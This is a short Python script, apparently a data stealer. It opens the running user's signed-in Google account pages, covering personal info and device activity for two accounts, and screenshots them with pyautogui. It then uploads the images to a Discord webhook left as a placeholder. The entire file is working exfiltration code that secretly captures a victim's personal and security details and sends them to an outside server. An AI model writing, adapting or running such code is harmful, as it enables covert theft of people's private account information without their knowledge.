import webbrowser
import time
import pyautogui
import os
import requests
import tempfile
from concurrent.futures import ThreadPoolExecutor

def zoom_out():
    # Press Ctrl and - keys to zoom out to 80%
    for _ in range(4):
        pyautogui.hotkey("ctrl", "-")

    pyautogui.hotkey("ctrl", "w")

def capture_screenshot(url, index):
    # Open the website using the default browser
    webbrowser.open(url)
    # Wait for the website to load
    time.sleep(2.5)

    # Generate and save the screenshot
    screenshot_name = f"screenshot{index}.png"
    screenshot_path = os.path.join(temp_dir, screenshot_name)
    pyautogui.screenshot(screenshot_path)
    return screenshot_path

# Define the list of website URLs
urls = [
    "https://myaccount.google.com/u/0/personal-info?hl=en",
    "https://myaccount.google.com/u/0/device-activity?continue=https%3A%2F%2Fmyaccount.google.com%2Fu%2F0%2Fsecurity%3Fhl%3Den&hl=en",
    "https://myaccount.google.com/u/1/personal-info?hl=en",
    "https://myaccount.google.com/u/1/device-activity?continue=https%3A%2F%2Fmyaccount.google.com%2Fu%2F0%2Fsecurity%3Fhl%3Den&hl=en",
]

# Open the first website using the default browser
webbrowser.open(urls[0])

# Wait for the website to load
time.sleep(2.5)

# Press Ctrl and - keys to zoom out to 80%
zoom_out()

# Get the user's temp directory
temp_dir = tempfile.gettempdir()

# Create a list to store screenshot paths
screenshot_paths = []

# Capture the first screenshot
screenshot_paths.append(capture_screenshot(urls[0], 0))

# Close the browser tab
pyautogui.hotkey("ctrl", "w")

# Prepare the payload and files for Discord
payload = {
    "content": "Screenshots for URLs:",
    "username": "Screenshot Bot"
}
files = {}

# Capture the remaining screenshots using ThreadPoolExecutor for parallel processing
with ThreadPoolExecutor() as executor:
    for index, url in enumerate(urls[1:], start=1):
        screenshot_paths.append(executor.submit(capture_screenshot, url, index).result())
        # Close the browser tab
        pyautogui.hotkey("ctrl", "w")




# Attach the screenshots to the payload
for index, path in enumerate(screenshot_paths):
    files[f"file{index}"] = open(path, "rb")

# Send the POST request to the Discord webhook URL
response = requests.post("YOUR DISCORD WEBHOOK HERE", data=payload, files=files)

# Close the browser window after capturing all screenshots
pyautogui.hotkey("ctrl", "w")
pyautogui.hotkey("ctrl", "w")
